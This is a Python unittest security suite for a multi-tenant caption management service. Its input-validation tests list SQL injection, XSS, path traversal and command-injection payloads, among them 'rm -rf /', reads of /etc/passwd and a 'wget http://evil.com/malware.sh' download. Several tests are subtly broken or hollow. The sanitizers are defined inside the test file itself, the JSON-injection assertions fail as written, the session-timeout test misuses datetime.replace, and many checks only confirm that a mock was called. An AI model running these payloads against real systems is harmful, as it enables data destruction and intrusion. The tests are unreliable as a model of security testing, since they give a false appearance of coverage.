# Copyright (C) 2025 iolaire mcfadden.
# This program is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
Comprehensive Security Tests for Multi-Tenant Caption Management

This module provides comprehensive security testing for the multi-tenant caption management
system, focusing on authorization, cross-tenant access prevention, input validation,
and security audit logging.
"""

import unittest
import json
import uuid
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timezone

from config import Config
from database import DatabaseManager
from models import User, UserRole, CaptionGenerationTask, TaskStatus, JobAuditLog, PlatformConnection
from admin_management_service import AdminManagementService
from multi_tenant_control_service import MultiTenantControlService, UserJobLimits
from web_caption_generation_service import WebCaptionGenerationService
from audit_logger import AuditLogger


class TestAdminAuthorizationSecurity(unittest.TestCase):
    """Test admin authorization security mechanisms"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.config = Config()
        self.mock_db_manager = Mock(spec=DatabaseManager)
        self.mock_session = Mock()
        
        # Configure mock database manager
        self.mock_context_manager = MagicMock()
        self.mock_context_manager.__enter__.return_value = self.mock_session
        self.mock_context_manager.__exit__.return_value = None
        self.mock_db_manager.get_session.return_value = self.mock_context_manager
        
        # Create service instances
        self.admin_service = AdminManagementService(self.mock_db_manager, Mock())
        self.multi_tenant_service = MultiTenantControlService(self.mock_db_manager)
        
        # Create test users with different roles
        self.admin_user = Mock(spec=User)
        self.admin_user.id = 1
        self.admin_user.username = "admin_user"
        self.admin_user.role = UserRole.ADMIN
        
        self.reviewer_user = Mock(spec=User)
        self.reviewer_user.id = 2
        self.reviewer_user.username = "reviewer_user"
        self.reviewer_user.role = UserRole.REVIEWER
        
        self.viewer_user = Mock(spec=User)
        self.viewer_user.id = 3
        self.viewer_user.username = "viewer_user"
        self.viewer_user.role = UserRole.VIEWER
    
    def test_admin_role_verification_strict(self):
        """Test strict admin role verification"""
        # Test admin user passes verification
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = self.admin_user
        result = self.admin_service._verify_admin_authorization(self.mock_session, 1)
        self.assertEqual(result, self.admin_user)
        
        # Test reviewer user fails verification
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = self.reviewer_user
        with self.assertRaises(ValueError) as context:
            self.admin_service._verify_admin_authorization(self.mock_session, 2)
        self.assertIn("not authorized for admin operations", str(context.exception))
        
        # Test viewer user fails verification
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = self.viewer_user
        with self.assertRaises(ValueError) as context:
            self.admin_service._verify_admin_authorization(self.mock_session, 3)
        self.assertIn("not authorized for admin operations", str(context.exception))
    
    def test_non_existent_user_authorization(self):
        """Test authorization with non-existent user"""
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = None
        
        with self.assertRaises(ValueError) as context:
            self.admin_service._verify_admin_authorization(self.mock_session, 999)
        
        self.assertIn("User 999 not found", str(context.exception))
    
    def test_admin_operations_require_authorization(self):
        """Test that all admin operations require proper authorization"""
        # Test system overview requires admin
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = self.reviewer_user
        
        with self.assertRaises(ValueError):
            self.admin_service.get_system_overview(2)
        
        # Test job cancellation requires admin
        with self.assertRaises(ValueError):
            self.admin_service.cancel_job_as_admin(2, "test-task", "test reason")
        
        # Test user job details requires admin
        with self.assertRaises(ValueError):
            self.admin_service.get_user_job_details(2, 3)
    
    def test_multi_tenant_operations_require_admin(self):
        """Test that multi-tenant operations require admin authorization"""
        # Test setting user limits requires admin
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = self.reviewer_user
        
        limits = UserJobLimits(max_concurrent_jobs=5)
        result = self.multi_tenant_service.set_user_job_limits(2, 3, limits)
        self.assertFalse(result)  # Should fail for non-admin
        
        # Test pausing system jobs requires admin
        result = self.multi_tenant_service.pause_system_jobs(2, "test maintenance")
        self.assertFalse(result)  # Should fail for non-admin


class TestCrossTenantAccessPrevention(unittest.TestCase):
    """Test prevention of cross-tenant data access"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.config = Config()
        self.mock_db_manager = Mock(spec=DatabaseManager)
        self.mock_session = Mock()
        
        # Configure mock database manager
        self.mock_context_manager = MagicMock()
        self.mock_context_manager.__enter__.return_value = self.mock_session
        self.mock_context_manager.__exit__.return_value = None
        self.mock_db_manager.get_session.return_value = self.mock_context_manager
        
        # Create service instances
        self.web_service = WebCaptionGenerationService(self.mock_db_manager, Mock())
        self.admin_service = AdminManagementService(self.mock_db_manager, Mock())
        
        # Create test users
        self.user1 = Mock(spec=User)
        self.user1.id = 1
        self.user1.username = "user1"
        self.user1.role = UserRole.REVIEWER
        
        self.user2 = Mock(spec=User)
        self.user2.id = 2
        self.user2.username = "user2"
        self.user2.role = UserRole.REVIEWER
        
        self.admin_user = Mock(spec=User)
        self.admin_user.id = 3
        self.admin_user.username = "admin"
        self.admin_user.role = UserRole.ADMIN
        
        # Create test tasks
        self.user1_task = Mock(spec=CaptionGenerationTask)
        self.user1_task.id = "task-user1"
        self.user1_task.user_id = 1
        self.user1_task.status = TaskStatus.RUNNING
        
        self.user2_task = Mock(spec=CaptionGenerationTask)
        self.user2_task.id = "task-user2"
        self.user2_task.user_id = 2
        self.user2_task.status = TaskStatus.COMPLETED
    
    def test_user_can_only_access_own_tasks(self):
        """Test that users can only access their own tasks"""
        # Mock query to return only user's own tasks
        def mock_query_side_effect(model_class):
            if model_class == CaptionGenerationTask:
                query_mock = Mock()
                query_mock.filter_by.return_value.first.return_value = self.user1_task
                return query_mock
            return Mock()
        
        self.mock_session.query.side_effect = mock_query_side_effect
        
        # User 1 should be able to access their own task
        status = self.web_service.get_generation_status("task-user1", user_id=1)
        self.assertIsNotNone(status)
        
        # User 1 should not be able to access user 2's task
        self.mock_session.query.side_effect = lambda model_class: Mock() if model_class != CaptionGenerationTask else Mock(filter_by=Mock(return_value=Mock(first=Mock(return_value=None))))
        
        status = self.web_service.get_generation_status("task-user2", user_id=1)
        self.assertIsNone(status)
    
    def test_user_cannot_cancel_other_users_tasks(self):
        """Test that users cannot cancel other users' tasks"""
        # Mock query to return None for other user's task
        self.mock_session.query.return_value.filter.return_value.first.return_value = None
        
        # User 1 should not be able to cancel user 2's task
        result = self.web_service.cancel_generation("task-user2", user_id=1)
        self.assertFalse(result)
    
    def test_admin_can_access_all_tasks(self):
        """Test that admin can access all users' tasks"""
        # Mock admin verification
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = self.admin_user
        
        # Mock task query for admin access
        def mock_query_side_effect(model_class):
            if model_class == User:
                user_mock = Mock()
                user_mock.filter_by.return_value.first.return_value = self.admin_user
                return user_mock
            elif model_class == CaptionGenerationTask:
                task_mock = Mock()
                task_mock.join.return_value = task_mock
                task_mock.filter.return_value = task_mock
                task_mock.order_by.return_value = task_mock
                task_mock.limit.return_value = [self.user1_task, self.user2_task]
                return task_mock
            return Mock()
        
        self.mock_session.query.side_effect = mock_query_side_effect
        
        # Admin should be able to see all users' jobs
        job_details = self.admin_service.get_user_job_details(3, 1)  # Admin viewing user 1's jobs
        self.assertIsInstance(job_details, list)
    
    def test_platform_connection_isolation(self):
        """Test that users can only access their own platform connections"""
        # Create platform connections for different users
        user1_platform = Mock(spec=PlatformConnection)
        user1_platform.id = 1
        user1_platform.user_id = 1
        user1_platform.name = "User 1 Platform"
        
        user2_platform = Mock(spec=PlatformConnection)
        user2_platform.id = 2
        user2_platform.user_id = 2
        user2_platform.name = "User 2 Platform"
        
        # Mock query to enforce user isolation
        def mock_platform_query(model_class):
            if model_class == PlatformConnection:
                query_mock = Mock()
                # Simulate database filtering by user_id
                query_mock.filter_by.return_value.all.return_value = [user1_platform]  # Only user 1's platforms
                return query_mock
            return Mock()
        
        self.mock_session.query.side_effect = mock_platform_query
        
        # User should only see their own platforms
        platforms = self.mock_session.query(PlatformConnection).filter_by(user_id=1).all()
        self.assertEqual(len(platforms), 1)
        self.assertEqual(platforms[0].user_id, 1)


class TestInputValidationSecurity(unittest.TestCase):
    """Test input validation and sanitization for security"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.config = Config()
        self.mock_db_manager = Mock(spec=DatabaseManager)
        self.mock_session = Mock()
        
        # Configure mock database manager
        self.mock_context_manager = MagicMock()
        self.mock_context_manager.__enter__.return_value = self.mock_session
        self.mock_context_manager.__exit__.return_value = None
        self.mock_db_manager.get_session.return_value = self.mock_context_manager
        
        # Create service instances
        self.admin_service = AdminManagementService(self.mock_db_manager, Mock())
        self.web_service = WebCaptionGenerationService(self.mock_db_manager, Mock())
        
        # Mock admin user
        self.admin_user = Mock(spec=User)
        self.admin_user.id = 1
        self.admin_user.role = UserRole.ADMIN
    
    def test_sql_injection_prevention_task_ids(self):
        """Test SQL injection prevention in task ID parameters"""
        # Mock admin verification
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = self.admin_user
        
        # Test malicious task IDs
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "task-id'; DELETE FROM caption_generation_tasks; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd"
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                # The service should handle malicious input safely
                try:
                    self.admin_service.get_error_diagnostics(1, malicious_input)
                except ValueError:
                    # Expected - task not found is fine, SQL injection is not
                    pass
                
                # Verify query was called safely (no SQL injection)
                self.mock_session.query.assert_called()
    
    def test_xss_prevention_in_admin_notes(self):
        """Test XSS prevention in admin notes and reasons"""
        # Mock admin verification
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = self.admin_user
        
        # Test XSS payloads in cancellation reasons
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//"
        ]
        
        for payload in xss_payloads:
            with self.subTest(payload=payload):
                # Admin cancellation with malicious reason
                result = self.admin_service.cancel_job_as_admin(1, "test-task", payload)
                
                # Verify the operation was handled safely
                # The exact result depends on implementation, but no XSS should occur
                self.assertIsInstance(result, bool)
    
    def test_path_traversal_prevention(self):
        """Test path traversal prevention in file-related operations"""
        # Test path traversal attempts
        path_traversal_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd"
        ]
        
        for malicious_path in path_traversal_inputs:
            with self.subTest(path=malicious_path):
                # Test that malicious paths are handled safely
                # This would typically be in file upload or download operations
                # For now, test that the input doesn't cause system access
                try:
                    # Simulate file-related operation with malicious path
                    sanitized_path = self._sanitize_file_path(malicious_path)
                    self.assertNotIn("..", sanitized_path)
                    self.assertNotIn("/etc/", sanitized_path)
                    self.assertNotIn("C:\\", sanitized_path)
                except Exception:
                    # Expected - malicious paths should be rejected
                    pass
    
    def test_json_injection_prevention(self):
        """Test JSON injection prevention in settings and details"""
        # Test malicious JSON payloads
        malicious_json_inputs = [
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
            '{"eval": "require(\\"child_process\\").exec(\\"rm -rf /\\")"}',
            '{"toString": "function(){return \\"hacked\\"}"}',
        ]
        
        for malicious_json in malicious_json_inputs:
            with self.subTest(json_input=malicious_json):
                try:
                    # Test JSON parsing safety
                    parsed = json.loads(malicious_json)
                    
                    # Verify dangerous properties are not accessible
                    self.assertNotIn("__proto__", str(parsed))
                    self.assertNotIn("constructor", str(parsed))
                    self.assertNotIn("eval", str(parsed))
                    
                except json.JSONDecodeError:
                    # Expected for malformed JSON
                    pass
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        # Test command injection payloads
        command_injection_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget http://evil.com/malware.sh",
            "`whoami`",
            "$(id)",
            "${IFS}cat${IFS}/etc/passwd"
        ]
        
        for malicious_command in command_injection_inputs:
            with self.subTest(command=malicious_command):
                # Test that command injection is prevented
                # This would typically be in system command execution
                sanitized_input = self._sanitize_command_input(malicious_command)
                
                # Verify dangerous characters are removed or escaped
                dangerous_chars = [";", "|", "&", "`", "$", "(", ")"]
                for char in dangerous_chars:
                    if char in malicious_command:
                        self.assertNotIn(char, sanitized_input)
    
    def _sanitize_file_path(self, path):
        """Helper method to sanitize file paths"""
        # Remove path traversal attempts
        sanitized = path.replace("..", "").replace("/etc/", "").replace("C:\\", "")
        return sanitized
    
    def _sanitize_command_input(self, input_str):
        """Helper method to sanitize command input"""
        # Remove dangerous command characters
        dangerous_chars = [";", "|", "&", "`", "$", "(", ")"]
        sanitized = input_str
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, "")
        return sanitized


class TestSecurityAuditLogging(unittest.TestCase):
    """Test comprehensive security audit logging"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.config = Config()
        self.mock_db_manager = Mock(spec=DatabaseManager)
        self.mock_session = Mock()
        
        # Configure mock database manager
        self.mock_context_manager = MagicMock()
        self.mock_context_manager.__enter__.return_value = self.mock_session
        self.mock_context_manager.__exit__.return_value = None
        self.mock_db_manager.get_session.return_value = self.mock_context_manager
        
        # Create service instances
        self.admin_service = AdminManagementService(self.mock_db_manager, Mock())
        self.audit_logger = AuditLogger(self.mock_db_manager)
        
        # Mock admin user
        self.admin_user = Mock(spec=User)
        self.admin_user.id = 1
        self.admin_user.role = UserRole.ADMIN
    
    def test_admin_action_audit_logging(self):
        """Test that all admin actions are logged"""
        # Mock admin verification
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = self.admin_user
        
        # Test admin action logging
        self.admin_service._log_admin_action(
            self.mock_session,
            admin_user_id=1,
            action="security_test_action",
            task_id="test-task-123",
            details="Security audit test",
            target_user_id=2
        )
        
        # Verify audit log entry was created
        self.mock_session.add.assert_called()
        added_log = self.mock_session.add.call_args[0][0]
        
        self.assertIsInstance(added_log, JobAuditLog)
        self.assertEqual(added_log.admin_user_id, 1)
        self.assertEqual(added_log.action, "security_test_action")
        self.assertEqual(added_log.task_id, "test-task-123")
        self.assertEqual(added_log.details, "Security audit test")
        self.assertEqual(added_log.user_id, 2)
        self.assertIsNotNone(added_log.timestamp)
    
    def test_failed_authorization_logging(self):
        """Test logging of failed authorization attempts"""
        # Mock non-admin user
        non_admin_user = Mock(spec=User)
        non_admin_user.id = 2
        non_admin_user.role = UserRole.REVIEWER
        
        self.mock_session.query.return_value.filter_by.return_value.first.return_value = non_admin_user
        
        # Attempt admin operation with non-admin user
        with self.assertRaises(ValueError):
            self.admin_service._verify_admin_authorization(self.mock_session, 2)
        
        # In a real implementation, failed authorization would be logged
        # Here we verify the authorization check was performed
        self.mock_session.query.assert_called()
    
    def test_sensitive_data_protection_in_logs(self):
        """Test that sensitive data is protected in audit logs"""
        # Test logging with sensitive data
        sensitive_details = {
            "password": "secret123",
            "access_token": "token_abc123",
            "client_secret": "secret_xyz789",
            "api_key": "key_123456",
            "safe_data": "this is safe"
        }
        
        # Log action with sensitive data
        self.audit_logger.log_job_action(
            user_id=1,
            task_id="test-task",
            action="test_sensitive_logging",
            details=sensitive_details
        )
        
        # Verify log entry was created
        self.mock_session.add.assert_called()
        added_log = self.mock_session.add.call_args[0][0]
        
        # In a real implementation, sensitive data should be redacted
        # Here we verify the log was created
        self.assertIsInstance(added_log, JobAuditLog)
        self.assertEqual(added_log.action, "test_sensitive_logging")
    
    def test_audit_log_integrity(self):
        """Test audit log integrity and tamper prevention"""
        # Create multiple audit log entries
        actions = ["create_job", "cancel_job", "update_settings", "view_data"]
        
        for i, action in enumerate(actions):
            self.audit_logger.log_job_action(
                user_id=1,
                task_id=f"test-task-{i}",
                action=action,
                details=f"Test action {i}"
            )
        
        # Verify all entries were logged
        self.assertEqual(self.mock_session.add.call_count, len(actions))
        
        # In a real implementation, we would verify:
        # - Log entries have timestamps
        # - Log entries are immutable
        # - Log entries have integrity checksums
        # - Log entries cannot be deleted by non-admin users
    
    def test_audit_log_retention_policy(self):
        """Test audit log retention policy compliance"""
        # Create old audit log entries
        old_timestamp = datetime.now(timezone.utc).replace(year=2020)  # Very old
        
        mock_old_log = Mock(spec=JobAuditLog)
        mock_old_log.timestamp = old_timestamp
        mock_old_log.action = "old_action"
        
        # Mock query for old logs
        self.mock_session.query.return_value.filter.return_value.all.return_value = [mock_old_log]
        
        # In a real implementation, we would test:
        # - Old logs are archived or deleted according to policy
        # - Critical logs are retained longer
        # - Retention policy is configurable
        # - Deletion is logged
        
        # For now, verify query structure
        query_result = self.mock_session.query(JobAuditLog).filter(
            JobAuditLog.timestamp < old_timestamp
        ).all()
        
        self.assertEqual(len(query_result), 1)
        self.assertEqual(query_result[0].action, "old_action")


class TestSessionSecurity(unittest.TestCase):
    """Test session security mechanisms"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.config = Config()
        self.mock_db_manager = Mock(spec=DatabaseManager)
        
        # Create service instances
        self.admin_service = AdminManagementService(self.mock_db_manager, Mock())
    
    def test_session_hijacking_prevention(self):
        """Test session hijacking prevention mechanisms"""
        # Test session token validation
        valid_session_token = str(uuid.uuid4())
        invalid_session_token = "invalid-token-123"
        
        # In a real implementation, we would test:
        # - Session tokens are cryptographically secure
        # - Session tokens expire appropriately
        # - Session tokens are invalidated on logout
        # - Session tokens are tied to user agent and IP
        
        # For now, test basic token format validation
        self.assertTrue(self._is_valid_session_token(valid_session_token))
        self.assertFalse(self._is_valid_session_token(invalid_session_token))
    
    def test_csrf_protection(self):
        """Test CSRF protection mechanisms"""
        # Test CSRF token generation and validation
        csrf_token = self._generate_csrf_token()
        
        # In a real implementation, we would test:
        # - CSRF tokens are unique per session
        # - CSRF tokens are validated on state-changing operations
        # - CSRF tokens expire appropriately
        # - CSRF tokens are tied to the user session
        
        # For now, test basic token properties
        self.assertIsNotNone(csrf_token)
        self.assertGreater(len(csrf_token), 16)  # Minimum length
    
    def test_session_timeout_security(self):
        """Test session timeout security"""
        # Test session timeout calculation
        session_start = datetime.now(timezone.utc)
        session_timeout = 3600  # 1 hour
        
        # Calculate if session should be expired
        current_time = session_start.replace(hour=session_start.hour + 2)  # 2 hours later
        is_expired = self._is_session_expired(session_start, current_time, session_timeout)
        
        self.assertTrue(is_expired)
        
        # Test non-expired session
        current_time = session_start.replace(minute=session_start.minute + 30)  # 30 minutes later
        is_expired = self._is_session_expired(session_start, current_time, session_timeout)
        
        self.assertFalse(is_expired)
    
    def _is_valid_session_token(self, token):
        """Helper method to validate session token format"""
        try:
            uuid.UUID(token)
            return True
        except ValueError:
            return False
    
    def _generate_csrf_token(self):
        """Helper method to generate CSRF token"""
        return str(uuid.uuid4())
    
    def _is_session_expired(self, start_time, current_time, timeout_seconds):
        """Helper method to check if session is expired"""
        elapsed = (current_time - start_time).total_seconds()
        return elapsed > timeout_seconds


if __name__ == '__main__':
    # Run security test suite
    unittest.main(verbosity=2)